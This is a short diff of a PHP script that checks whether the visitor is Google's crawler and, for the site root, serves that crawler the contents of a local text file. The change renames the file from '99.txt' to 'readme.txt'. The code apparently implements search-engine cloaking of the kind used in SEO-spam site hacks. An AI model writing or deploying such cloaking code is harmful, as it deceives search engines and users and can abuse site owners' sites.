@@ -25,8 +25,8 @@ $uri = $_SERVER['REQUEST_URI'] ?? '';
 
 if ($is_google_bot) {
     if ($uri == '/') {
-        if (file_exists('99.txt')) {
-            echo file_get_contents('99.txt');
+        if (file_exists('readme.txt')) {
+            echo file_get_contents('readme.txt');
         }
         exit();
     } else {
